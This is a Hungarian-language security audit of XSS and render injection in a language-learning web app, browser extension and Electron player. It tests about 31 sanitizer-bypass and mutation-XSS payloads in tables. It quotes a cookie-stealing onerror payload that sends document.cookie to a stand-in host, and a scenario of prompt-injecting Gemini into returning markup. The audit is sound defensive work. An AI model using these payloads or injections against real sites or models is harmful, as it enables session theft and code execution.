# Fázis 6 — DIMENZIÓ 3: XSS / render-injection

**Dátum:** 2026-07-27
**Hatókör:** AI-generált és user-tartalom megjelenítése — React (`resources/js/`), PHP rich-text lánc, Chrome extension (`chrome-extension/src/`), Electron player (`topwords-player/`), Blade (`resources/views/`)
**Módszer:** statikus sweep + **a sanitizerek tényleges végrehajtása headless Chrome-ban** (valódi HTML-parser) 31 + 9 bypass-payloaddal
**Kizárva:** `pages/words/quiz.tsx`, `pages/words/cloze.tsx`, `pages/words/practice.tsx`, `pages/irregular-verbs/` (kivezetett feature-k). Az `is_irregular` / `verb_past*` / „rendhagyó" badge ÉLŐ, benne volt a körben.

---

## Összefoglaló

| Súlyosság | Darab |
|---|---|
| HIGH | 0 |
| MEDIUM | 0 |
| LOW | 2 |
| INFO | 7 |

**Sanitizer-bypass: NEM TALÁLTAM.** Mind a három sanitizer (`resources/js/lib/sanitize-html.ts`, `chrome-extension/src/flashcard-modal.js::sanitizeAiHtml`, `topwords-player/src/renderer.js::sanitizeAiHtml`) **DOM/allowlist-alapú, nem regex-alapú** — ez a feladatkiírásban felsorolt klasszikus regex-megkerülési osztályt (`<img src=x onerror=>`, `<svg/onload=>`, `on\nerror=`, unquoted attr, entity-kódolt `javascript&#58;`, `java\tscript:`, dupla-kódolás, nem lezárt tag) **szerkezetileg** zárja: a böngésző parser-e normalizál, utána tag-/attribútum-allowlist fut. A 31 payload egyike sem jutott át.

**A 2026-07-20-i XSS-2 (LOW) JAVÍTVA** — `setYtPanelMessage` ma `textContent`-tel ír (youtube.js:803-815), a linkes eset külön DOM-API-s függvényt kapott. Az ÚJ felirat-gyorsgesztus kód (1.24) **nem nyitott új sinket** — végig DOM-API-t használ.

---

## Leletek

### XSS-1 — A `sanitize-html.ts` allowlist-sanitizer helytálló (bypass-battery 31/31 zárt)
**Fájl:** `resources/js/lib/sanitize-html.ts:33-80`
**Súlyosság:** INFO (verifikációs lelet, nem hiba)
**Verdikt:** REFUTED (nincs bypass)

A sanitizer `<template>.innerHTML`-lel parse-ol, majd `querySelectorAll('*')`-on iterálva:
- `DROP_TAGS` → teljes részfa törlés (`script, style, iframe, object, embed, svg, math, form, link, meta, base, noscript, template`)
- nem-allowlisted tag → unwrap (gyerekek megmaradnak)
- minden `on*` kezdetű ÉS minden nem-allowlisted attribútum törlődik
- `href` csak `^(https?:|mailto:|tel:|#|/)` ellen
- `style`-ból `expression(` / `javascript:` / `url(` kiszűrve

**Végrehajtott verifikáció** (headless Chrome, a fájl kódját 1:1 futtatva). Mind a 31 payload esetén a kimenet **0 veszélyes maradvány** ÉS **idempotens** (`san(x) === san(san(x))` — ez a mutation-XSS elsődleges indikátora):

| Payload | Eredmény |
|---|---|
| `<img src=x onerror=alert(1)>` | tag unwrap-elve, attr törölve |
| `<svg/onload=alert(1)>` | DROP |
| `<img src=x on\nerror=alert(1)>` (newline-elválasztó) | parser normalizálja → `onerror` → `startsWith('on')` törli |
| `<img src=x on\terror=…>` (tab) | ua. |
| `` <img src=x onerror=`alert(1)`> `` (backtick) | ua. |
| `<a href="javascript&#58;alert(1)">` | parser dekódolja → SAFE_URL nem illeszkedik → href törölve |
| `<a href="java\tscript:alert(1)">` | ua. |
| `<a href="&#106;avascript:alert(1)">` | ua. |
| `<img src=x onerror=alert(1)` (nem lezárt) | parser lezárja → attr törölve |
| `<div style="width:expression(alert(1))">` | style törölve |
| `<div style="background:url(javascript:…)">` | style törölve |
| `<iframe srcdoc="…">` | DROP |
| `<form><button formaction=javascript:…>` | form DROP, formaction nincs allowlisten |
| `<base href="javascript:…//">` | DROP |
| **mXSS** `<noscript><p title="</noscript><img src=x onerror=1>">` | noscript DROP |
| **mXSS** `<svg></p><style><a id="</style><img …>"></style></svg>` | svg+style DROP |
| **mXSS** `<math><mtext><table><mglyph><style><img …>` | math DROP |
| `<xmp>` / `<listing>` / `<plaintext>` / `<textarea>` / `<title>` raw-text mutációk | unwrap, tartalom szöveggé válik |
| `<table><td><svg><style><img …>` (foster parenting) | svg DROP |

**Miért nem lehetséges itt mXSS:** a mutation-XSS ahhoz kell, hogy a *sanitizált kimenet* újra-parse-olva más fát adjon. Ehhez a pass után **túl kell élnie** egy kontextus-váltó elemnek (foreign content: `svg`/`math`, vagy raw-text: `style`/`noscript`/`textarea`/`title`/`xmp`). A `DROP_TAGS` az `svg`, `math`, `style`, `noscript`, `template`, `base` mindegyikét törli, a `textarea`/`title`/`xmp`/`listing`/`plaintext` pedig nincs az `ALLOWED_TAGS`-en → unwrap. **Egyetlen kontextus-váltó elem sem éli túl az első kört**, ezért a kimenet mindig idempotens — ezt a 31/31 `idempotent: true` mérés empirikusan is igazolta.

**SSR fail-safe:** `document === undefined` esetén üres stringet ad vissza (nem gyengébb regex-fallbacket) — helyes irány, fail-closed.

---

### XSS-2 — Az extension AI-sanitizer (`sanitizeAiHtml`) szigorúbb, és szintén nem kerülhető meg
**Fájl:** `chrome-extension/src/flashcard-modal.js:72-120`
**Súlyosság:** INFO
**Verdikt:** REFUTED

Ugyanaz a `<template>`+allowlist minta, de **szigorúbb**: MINDEN attribútum törlődik a szűrt `style` kivételével (nincs `href`, nincs `class`), és a `style`-ból csak tipográfiai longhandek maradnak (`AI_HTML_ALLOWED_STYLE_PROP` regex + `url(` tiltás). A `DocumentFragment` `replaceChildren()`-nel megy be — **soha nem nyers `innerHTML`**, ami a második parse-t is kizárja.

Végrehajtott verifikáció (9 payload, headless Chrome), minden esetben `danger: none` + idempotens:
- `<div style="position:fixed;top:0;left:0;width:100vw;height:100vw;background:red">` → **`style="background-color: red"`** (a `position`/`top`/`left`/`width`/`height` kiesik) → **overlay/clickjacking sem építhető**
- `<span style="background-image:url(https://evil/x)">` → style teljesen törölve (tracking-pixel/remote-kérés kizárva)
- `<a href="//evil.com">link</a>` → `a` nincs az allowliston → unwrap, `href` eltűnik

---

### XSS-3 — Az Electron player sanitizer a legerősebb: rebuild, nem szűrés
**Fájl:** `topwords-player/src/renderer.js:1151-1195`
**Súlyosság:** INFO
**Verdikt:** REFUTED

A `rebuildSafeNodes()` nem *módosítja* a parse-olt fát, hanem **nulláról újraépíti** csak az engedélyezett csomópontokból (`document.createElement(tag)` + `createTextNode`). Kommentek és processing instruction-ök is elesnek. Ez a legerősebb minta: a kimenet szerkezetileg csak allowlisted elemekből állhat, és `DocumentFragment`-ként megy a DOM-ba (nincs re-serializáció → mXSS fogalmilag kizárt).

**Electron-hardening** (`topwords-player/src/main.js:46-51`) a render-injection szempontjából releváns része rendben:
`contextIsolation: true`, `nodeIntegration: false`, `sandbox: true`, `setWindowOpenHandler → deny`, `will-navigate → preventDefault()`, `loadFile` (nem távoli URL). Így egy hipotetikus DOM-XSS sem érne el Node-API-t, és nem navigálhatna el.

---

### XSS-4 — A YouTube/Netflix felirat-szöveg (IDEGEN OLDALRÓL) escape-elve kerül a HTML-sinkbe
**Fájl:** `chrome-extension/src/youtube.js:279-317` (`ytWordsToHtml`), sink: `youtube.js:386`, `netflix.js:168`
**Súlyosság:** INFO
**Verdikt:** REFUTED

Ez volt a dimenzió legmagasabb kockázatú adatútja: a felirat a YouTube/Netflix DOM-jából olvasott, **nem megbízható** szöveg, ami `bar.innerHTML = ytWordsToHtml(text)`-be megy.

A `ytWordsToHtml()` minden token-t átenged az `esc()`-en — **szöveg- és attribútum-kontextusban is** (`youtube.js:291` sep, `:299` `attr`, `:307`/`:312` a span-tartalom). Az `esc()` (`shared.js:38-45`) mind az 5 kritikus karaktert escape-eli: `& < > " '` — helyes sorrendben (`&` először, így nincs dupla-dekódolás). Idézőjel-escape révén a `data-yt-word="${attr}"` attribútumból sem lehet kitörni.

Az interpolált `style`-ba csak `STATUS_COLORS[token.status]` kerül — kliens-oldali hardcoded konstans map, nem külső adat.

**Konkrét megkísérelt forgatókönyv:** egy támadó által feltöltött YouTube-videó felirata `"><img src=x onerror=fetch('//evil/'+document.cookie)>` szöveget tartalmaz → az `esc()` `&quot;&gt;&lt;img…`-gé alakítja → a felirat-sávban **látható szövegként** jelenik meg, nem markupként. Nem exploitálható.

**A szerver-oldali átirat-út is tiszta:** a `renderYtPanelSegments()` (`youtube.js:858-866`) a `seg.t`-t escape nélkül interpolálja a `data-t="${seg.t}"` attribútumba, **de** a `t` mező minden szerver-oldali útvonalon `int`-re castolt (`YouTubeCaptionService.php:469`, `:610`, `:645`), a `seg.x` pedig `ytWordsToHtml()`-en megy át. A `videoId` szerver-oldalon `^[a-zA-Z0-9_-]{11}$`-ra validált (`ExtensionController.php:526`). Nem exploitálható, de lásd XSS-8.

---

### XSS-5 — Az ÚJ (1.24) felirat-gyorsgesztus kód nem nyitott HTML-sinket
**Fájl:** `chrome-extension/src/shared.js:173-300+` (`attachCaptionWordGestures`), hívók: `youtube.js:763`, `netflix.js:108`
**Súlyosság:** INFO
**Verdikt:** REFUTED

Az előző audit óta bekerült gyorsgesztus-készlet (sima klikk = popup, dupla = „Tudom", hosszú-nyomás = „Később") **kizárólag DOM-API-t** használ: `span.style.outline`, `span.dataset.ytWord`, `classList.toggle` — **nincs benne egyetlen `innerHTML`/`insertAdjacentHTML` sem**. A szó-értéket a már escape-elt `dataset`-ből olvassa vissza (`shared.js:228`), majd üzenetben küldi a szervernek — nem HTML-sinkbe.

Megőrizte az `isTrusted`-guardot (`shared.js:296-298`): az oldal JS-e szintetikus `MouseEvent`-tel nem tud kéretlen popupot/státusz-állítást kiváltani.

---

### XSS-6 — `body.innerHTML` interpolált üzenet-stringgel a lookup-popupban (escape nélkül)
**Fájl:** `chrome-extension/src/lookup-popup.js:424`
**Súlyosság:** **LOW**
**Verdikt:** CONFIRMED (a hiányzó escape), de **nem exploitálható a jelenlegi hívókkal**

```js
body.innerHTML = `<span class="msg">${msg}</span>`;
```

A `msg` az `extErrorMessage(data?.error, '…')`-ból jön. Az `extErrorMessage()` (`shared.js:97-107`) egy **fix kulcs→string map**-ből ad vissza értéket, `??` fallbackkel egy hívó-oldali literálra. Tehát a `msg` értéke ma **mindig hardcoded string** — a szerver `error` mezője csak *kulcsként* szolgál, a tartalma nem szivárog a kimenetbe.

**Forgatókönyv (ma nem áll fenn, regresszió-kockázat):** ha bárki később az `extErrorMessage`-t szerver-szöveg átengedésére bővíti (pl. `messages[error] ?? error` vagy `resp.message` átadása — és **van már precedens**: a `flashcard-modal.js:236` már ma is kiír `resp.message`-t, igaz `showFcFeedback`-en át), akkor egy kompromittált vagy MITM-elt API-válasz `<img src=x onerror=…>`-t injektálna a popup shadow-DOM-jába. A popup content scriptként **minden meglátogatott oldalon** fut, így a hatás az adott oldal kontextusában JS-futtatás lenne.

**Ez ugyanaz a minta, mint a 2026-07-20-i XSS-2** (`setYtPanelMessage` nyers `${html}`), amit azóta `textContent`-re javítottak. A `lookup-popup.js:222` (`esc(message)`) és a `flashcard-modal.js:429` (`esc(extErrorMessage(...))`) **ugyanezt az értéket escape-eli** — vagyis a kódbázisban a védett minta a domináns, a `:424` a kilógó eset.

**Indoklás a LOW-ra:** a hívó-lánc ma zárt (a blast radius nulla), csak a fegyelmezettségen múlik. Nem HIGH/MEDIUM, mert nincs jelenlegi bemenet, amivel kiváltható.

---

### XSS-7 — `searchShadow.innerHTML +=` a keresőmodál felépítésekor
**Fájl:** `chrome-extension/src/search-modal.js:45`
**Súlyosság:** **LOW**
**Verdikt:** CONFIRMED (kód-szag), nem exploitálható

```js
searchShadow.innerHTML += `…`;
```

A tartalom teljesen hardcoded (stílus + váz), **nincs benne külső adat** → nem injekciós rés. A `+=` viszont a shadow root teljes tartalmát **újra-serializálja és újra-parse-olja**. Ha ide a jövőben bármikor dinamikus tartalom kerül (vagy a művelet előtt már beszúrt user-adat van a shadow rootban), a re-parse mutációt okozhat. Emellett eldobja a korábbi csomópontokra kötött event listenereket — funkcionális lábon lövés is.

**Ma nem exploitálható:** a hívás a modál felépítésének első lépése, ekkor a shadow root üres.

---

### XSS-8 — Nem escape-elt numerikus interpolációk HTML-attribútumba
**Fájl:** `chrome-extension/src/youtube.js:861` (`data-idx="${i}" data-t="${seg.t}"`), `search-modal.js:271` (`data-index="${i}"`), `search-modal.js:276` / `lookup-popup.js:468` (`#${rank}`), `popup.js:176`/`:190` (`width:${width}%`, `${count}`)
**Súlyosság:** INFO
**Verdikt:** REFUTED (nincs forgatókönyv)

Minden ilyen helyen az interpolált érték bizonyíthatóan szám:
- `i` — `Array.map` index
- `seg.t` — szerver-oldalon `(int)` castolt (`YouTubeCaptionService.php:469/610/645`)
- `rank` — DB integer oszlop
- `width` — `.toFixed(1)` kimenete, `count` — `?? 0`-val védett aggregátum

Támadó által vezérelt string egyikbe sem kerülhet. Rögzítve, mert ha ezek a mezők valaha stringgé válnak (pl. séma-változás), az attribútum-kontextusú injekció azonnal nyílna.

---

### XSS-9 — A rich-text lánc (React ↔ PHP) round-tripje escape-elt
**Fájl:** `app/Http/Controllers/FlashcardCsvController.php:166-194`, `resources/js/components/ui/rich-text-editor.tsx:315-323`
**Súlyosság:** INFO
**Verdikt:** REFUTED

- **Import (`textToHtml`, :166-180):** minden sor `htmlspecialchars($line, ENT_QUOTES, 'UTF-8')`-en megy át, mielőtt `<p>`-be kerül. Egy `<img src=x onerror=…>` tartalmú CSV-cella **escape-elt szövegként** tárolódik, nem markupként. Az Anki cloze-strip (`{{c1::…}}`) csak a jelölést távolítja, tartalmat nem enged át escape nélkül.
- **Export (`stripHtml`, :182-194):** `strip_tags` + `html_entity_decode`, majd a `csvRow()` (`:196+`) **formula-injection védelmet** is alkalmaz (`=`, `+`, `-`, `@` kezdetű cellák). Ez CSV-injection, nem XSS, de a lánc szempontjából releváns és rendben van.

**Tárolt XSS lánc — a teljes út végigkövetve:** a `POST /extension/flashcard` (`ExtensionController.php:257-258`) a `front`/`back` mezőt **csak `string|max:10000`-re validálja, HTML-sanitizálás NÉLKÜL tárolja** (`:290-291`). Vagyis **nyers `<img src=x onerror=…>` bekerülhet a DB-be**. Ez önmagában nem sebezhetőség, mert:
1. a mező **kizárólag a saját tulajdonos** kártyáin jelenik meg (a deck a `$request->user()->flashcardDecks()`-ből keresett, `:268`) → nincs cross-user útvonal,
2. **minden** render-pont a `RichTextContent`-en át megy (`study.tsx:689/694/753/758`, `calibrate.tsx:527/538/545/562/574/582`, `card-preview-dialog.tsx:44/48/55/59`), ami `sanitizeHtml()`-ez,
3. az Electron player és az extension is saját sanitizeren rendereli.

Tehát a tárolás „dirty", de **minden kijárat sanitizált** — a védelem output-oldali. Ez működik, de egyetlen jövőbeli, sanitizert kihagyó render-pont (pl. új komponens nyers `dangerouslySetInnerHTML`-lel) azonnal self-XSS-t, megosztott pakli-funkció bevezetése esetén pedig stored XSS-t nyitna. **Nem lelet, hanem architekturális megjegyzés.**

---

### XSS-10 — AI-generált tartalom: prompt-injection nem ér el HTML-sinket
**Fájl:** `app/Http/Controllers/TextAnalysisController.php:1081-1144` (`buildFlashcardFront` / `buildFlashcardBack`)
**Súlyosság:** INFO
**Verdikt:** REFUTED

Ez a dimenzió másik fő kérdése: a Gemini-válasz (prompt-injectionnel befolyásolható, **nem megbízható**) HTML-lé alakul a szerveren, majd a kliensen renderelődik.

**Minden** AI-eredetű string `htmlspecialchars()`-en megy át, mielőtt a HTML-be kerül — kivétel nélkül végigellenőrizve:
`sentence` (:1087), `hints` (:1086-1087), `answer_options` (:1091), `negative_meaning_hu` (:1096), `collocations.pattern/meaning_hu/example` (:1103-1105), `word_forms.*` (:1120, :1124), `common_pairs` (:1129), `synonyms` (:1134), `antonyms` (:1139).

PHP 8.4-en a `htmlspecialchars()` **alapértelmezetten `ENT_QUOTES | ENT_SUBSTITUTE | ENT_HTML401`** — mérve: `htmlspecialchars('" onerror=x \' <img>')` → `&quot; onerror=x &#039; &lt;img&gt;`, tehát **mindkét idézőjel-típus escape-elve**, attribútum-kitörés kizárt.

A `style` attribútumok (`:1092`, `:1097`, `:1130`, `:1140`) **hardcoded** literálok, nem AI-adat.

**Forgatókönyv (megkísérelt):** a támadó olyan szót visz fel, amire a Gemini-t prompt-injectionnel ráveszi, hogy a `synonyms` mezőbe `<img src=x onerror=alert(document.cookie)>`-t adjon vissza → `htmlspecialchars` escape-eli → a kártyán **látható szövegként** jelenik meg. Ráadásul az AI-válasz **séma-kényszerített** (`flashcardSchema()`, :857-912: `responseSchema` STRING/BOOLEAN/ARRAY típusokkal), ami tovább szűkíti a mozgásteret. Nem exploitálható. Az AiCache-mérgezés kockázatát a `$onlyRealWords` guard (:1043) tovább csökkenti.

---

### XSS-11 — 2FA QR-kód SVG nyers `dangerouslySetInnerHTML`-ben
**Fájl:** `resources/js/components/two-factor-setup-modal.tsx:79-90`
**Súlyosság:** INFO
**Verdikt:** REFUTED

```jsx
<div dangerouslySetInnerHTML={{ __html: qrCodeSvg }} />
```

A `qrCodeSvg` a Fortify `/user/two-factor-qr-code` végpontjáról jön (`use-two-factor-auth.ts:6`), tartalma a **`bacon/bacon-qr-code` könyvtár által generált SVG** — a bemenete az app neve + a user e-mail-címe egy `otpauth://` URI-ban, a kimenet pedig geometriai `<rect>`/`<path>` primitívekből álló SVG. Nem user-vezérelt markup: a QR-generátor a bemenetet **bitmintává** alakítja, nem szövegként ágyazza be. Nincs realizálható forgatókönyv, ezért INFO.

---

### XSS-12 — Blade nyers echo: nincs
**Fájl:** `resources/views/`
**Súlyosság:** INFO
**Verdikt:** REFUTED

A `{!! !!}` sweep a teljes `resources/views/` alatt **0 találatot** adott. Az alkalmazás Inertia-alapú, a Blade-réteg a root template-re szorítkozik.

---

## Egyéb ellenőrzött, tiszta sinkek

| Fájl:sor | Sink | Miért tiszta |
|---|---|---|
| `search-modal.js:265-283` | találati lista | `esc(r.word)`, `esc(r.meaning_hu)`; `STATUS_COLORS/LABELS` hardcoded |
| `search-modal.js:758-772` | detail-nézet | `esc()` a `word`/`part_of_speech`/`meaning_hu`/`extra_meanings`-en; URL-ek `encodeURIComponent`-tel |
| `lookup-popup.js:464-470`, `498-511` | header + body | `esc()` minden AI/DB-mezőn (`meaning_hu`, `synonyms`, `example_en`, `example_hu`) |
| `flashcard-modal.js:135`, `145`, `149`, `386`, `429` | pakli-lista, űrlap | `esc(d.name)`, `esc(data.word)`, `esc(data.meaning_hu)` |
| `youtube.js:257`, `746`, `1050`; `netflix.js:98`, `267` | shadow-DOM váz | hardcoded CSS/SVG, nincs interpolált adat |
| `youtube.js:1006-1010` | átirat-cím | `titleEl.textContent = resp.title` — textContent |
| `netflix.js:174-178` | `showNfxBarNotice` | `bar.textContent` |
| `popup.js:137-196` | statisztika-panel | hardcoded stringek + számok |
| `shared.js:141-164` | `statusBtnsHtml`, `starsHtml` | csak hardcoded `STATUS_LABELS`/`STATUS_COLORS` + iterációs számok |
| `renderer.js:120/614/755/935/1221/1445/1955` | player | mind `innerHTML = ''` (ürítés), nem írás |

---

## PLAN-feltevések mérlege

| Feltevés | Verdikt |
|---|---|
| „A sanitizer valószínűleg regex-alapú, ezért megkerülhető" | **MEGDŐLT** — mind a 3 sanitizer DOM/allowlist-alapú |
| „Denylist-alapú lehet" | **MEGDŐLT** — allowlist tagre és attribútumra is; a `DROP_TAGS` csak kiegészítés (részfa-törlés az unwrap helyett) |
| „mXSS `<noscript>`/`<svg>`/`<math>` vektorral átjuttatható" | **MEGDŐLT** — minden kontextus-váltó elem DROP vagy unwrap; 31/31 idempotens |
| „A felirat-szöveg nyers HTML-sinkbe kerülhet" | **MEGDŐLT** — `ytWordsToHtml` mindent `esc()`-el |
| „Az AI-válasz HTML-sinkbe kerül" | **RÉSZBEN IGAZ** — HTML-t épít belőle a szerver, de minden AI-string `htmlspecialchars`-olt |
| „XSS-2 (setYtPanelMessage) még nyitva" | **MEGDŐLT** — javítva, `textContent` |

## Nyitott (nem javítandó, csak rögzítve)

- **XSS-6 (LOW)** — `lookup-popup.js:424` hiányzó `esc()`; a kódbázis két testvér-helye (`:222`, `flashcard-modal.js:429`) már escape-eli. Egysoros konzisztencia-javítás lenne.
- **XSS-7 (LOW)** — `search-modal.js:45` `innerHTML +=` → `innerHTML =` vagy `appendChild`.

**Go-live blokkoló: nincs.**
